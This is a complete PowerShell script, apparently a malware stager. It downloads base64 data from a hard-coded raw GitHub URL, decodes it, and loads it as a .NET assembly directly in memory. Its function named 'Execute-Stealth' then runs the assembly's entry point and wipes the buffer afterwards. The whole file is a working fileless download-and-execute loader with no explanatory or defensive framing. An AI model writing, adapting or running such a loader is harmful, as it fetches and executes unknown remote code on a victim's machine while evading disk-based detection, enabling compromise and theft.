[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12

function Download-Base64 {
    param (
        [string]$url
    )
    $base64 = Invoke-RestMethod -Uri $url
    return $base64
}

function Decode-Base64 {
    param (
        [string]$base64
    )
    $bytes = [Convert]::FromBase64String($base64)
    return $bytes
}

function Execute-InMemory {
    param (
        [byte[]]$bytes
    )

    $script:mainAssembly = $null
    
    $onAssemblyResolve = {
        param($sender, $e)
        if ($e.Name -like "*mscorlib*") {
            return $null
        }
        
        if ($script:mainAssembly -ne $null) {
            try {
                $requestedAssembly = $script:mainAssembly.GetType($e.Name.Split(',')[0])
                if ($requestedAssembly -ne $null) {
                    return $script:mainAssembly
                }
            } catch {}
        }
        
        foreach ($assembly in [System.AppDomain]::CurrentDomain.GetAssemblies()) {
            if ($assembly.FullName -eq $e.Name) {
                return $assembly
            }
        }
        
        return $null
    }

    $resolverField = [System.AppDomain].GetField('_AssemblyResolve', [System.Reflection.BindingFlags]::NonPublic -bor [System.Reflection.BindingFlags]::Instance)
    if ($resolverField -ne $null) {
        $currentResolver = $resolverField.GetValue([System.AppDomain]::CurrentDomain)
        if ($currentResolver -eq $null) {
            [System.AppDomain]::CurrentDomain.add_AssemblyResolve($onAssemblyResolve)
        }
    } else {
        [System.AppDomain]::CurrentDomain.add_AssemblyResolve($onAssemblyResolve)
    }

    $script:mainAssembly = [System.Reflection.Assembly]::Load($bytes)
    
    $entryPoint = $script:mainAssembly.EntryPoint
    if ($entryPoint -ne $null) {
        $entryPoint.Invoke($null, @()) | Out-Null
    }
}

function Execute-Stealth {
    param (
        [string]$url
    )

    $base64 = Download-Base64 -url $url
    $bytes = Decode-Base64 -base64 $base64
    Execute-InMemory -bytes $bytes

    if ($bytes -ne $null) {
        [Array]::Clear($bytes, 0, $bytes.Length)
    }
}

$url = "https://raw.githubusercontent.com/thegoatofapi/AL/refs/heads/main/file.txt"

Execute-Stealth -url $url
